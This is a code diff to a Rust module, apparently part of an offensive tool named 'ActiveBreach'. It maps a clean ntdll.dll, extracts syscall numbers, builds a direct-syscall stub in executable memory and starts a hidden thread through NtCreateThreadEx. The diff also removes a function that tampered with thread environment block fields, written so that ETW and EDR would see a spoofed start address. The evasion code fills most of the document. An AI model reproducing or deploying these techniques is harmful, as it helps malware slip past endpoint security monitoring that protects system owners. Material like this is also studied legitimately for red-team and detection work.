@@ -3,7 +3,6 @@
 //! This module provides functions to:
 //! - Map a clean copy of `ntdll.dll`, extract syscall stubs, and spawn a hidden thread via `NtCreateThreadEx`.
 //! - Build a direct syscall stub in RWX memory.
-//! - “Soft-nuke” the TEB of the current thread to erase tracking artifacts (last error, user pointer, start address).
 
 use std::ptr::null_mut;
 use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID};
@@ -43,21 +42,21 @@ const OFFSET_TEB_START_ADDR: usize = 0x1720;
 /// - `NtCreateThreadEx` entry is not found.
 /// - Stub creation fails.
 /// - The syscall itself returns a non-zero status.
-pub unsafe fn spawn_ab_thread() -> Result<(), u32> {
+pub unsafe fn _SpawnActiveBreachThread() -> Result<(), u32> {
     let mut mapped_size = 0;
     let (mapped_base, _) = mapper::buffer(&mut mapped_size)
-        .ok_or_else(|| ab_err_code(ABError::ThreadFilemapFail))?;
+        .ok_or_else(|| ABErr(ABError::ThreadFilemapFail))?;
 
-    if exports::extract_syscalls(mapped_base, mapped_size).is_err() {
-        return Err(ab_err_code(ABError::ThreadSyscallInitFail));
+    if exports::ExSyscalls(mapped_base, mapped_size).is_err() {
+        return Err(ABErr(ABError::ThreadSyscallInitFail));
     }
 
     let table = exports::get_syscall_table()
-        .ok_or_else(|| ab_err_code(ABError::ThreadSyscallTableMiss))?;
+        .ok_or_else(|| ABErr(ABError::ThreadSyscallTableMiss))?;
 
     let ssn = *table
         .get("NtCreateThreadEx")
-        .ok_or_else(|| ab_err_code(ABError::ThreadNtCreateMissing))?;
+        .ok_or_else(|| ABErr(ABError::ThreadNtCreateMissing))?;
 
     let stub_ptr = VirtualAlloc(
         null_mut(), 0x20,
@@ -66,7 +65,7 @@ pub unsafe fn spawn_ab_thread() -> Result<(), u32> {
     ) as *mut u8;
 
     if stub_ptr.is_null() {
-        return Err(ab_err_code(ABError::ThreadStubAllocFail));
+        return Err(ABErr(ABError::ThreadStubAllocFail));
     }
 
     let tmpl: [u8; 11] = [
@@ -107,7 +106,7 @@ pub unsafe fn spawn_ab_thread() -> Result<(), u32> {
     VirtualFree(stub_ptr as _, 0, MEM_RELEASE);
 
     if status != 0 {
-        return Err(ab_err_code(ABError::ThreadCreateFail));
+        return Err(ABErr(ABError::ThreadCreateFail));
     }
 
     CloseHandle(thread);
@@ -167,38 +166,4 @@ pub unsafe fn direct_syscall_stub(
     VirtualProtect(stub as _, 0x20, PAGE_EXECUTE_READ, &mut old);
 
     Some(std::mem::transmute(stub))
-}
-
-/// “Soft-nukes” the current thread’s TEB for stealth/hardening:
-/// - Clears the LastErrorValue field to 0.
-/// - Clears the ArbitraryUserPointer to null.
-/// - Overwrites the StartAddress (SubSystemTib) with the base of `ntdll.dll`,
-///   so ETW / EDR sees the thread entry as a legitimate ntdll call.
-///
-/// # Safety
-/// - Inline assembly reads `gs:[0x30]` to obtain the TEB pointer.
-/// - Assumes the TEB layout and offsets are correct for this Windows version.
-/// - Must be run at thread start before any critical operations.
-pub unsafe fn nuke_teb_soft() -> Result<(), u32> {
-    let teb: *mut u8;
-    core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
-
-    let rsp: usize;
-    core::arch::asm!("mov {}, rsp", out(reg) rsp);
-
-    let stack_base = *(teb.add(OFFSET_TEB_STACK_BASE) as *const usize);
-    let stack_limit = *(teb.add(OFFSET_TEB_STACK_LIMIT) as *const usize);
-    if rsp < stack_limit || rsp > stack_base {
-        return Err(ab_err_code(ABError::ThreadTEBCorruptSkip));
-    }
-
-    (teb.add(OFFSET_TEB_LAST_ERROR) as *mut u32).write_volatile(0);
-    (teb.add(OFFSET_TEB_ARBITRARY_PTR) as *mut *mut u8).write_volatile(null_mut());
-
-    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
-    if !ntdll.is_null() {
-        (teb.add(OFFSET_TEB_START_ADDR) as *mut PVOID).write_volatile(ntdll as PVOID);
-    }
-
-    Ok(())
 }
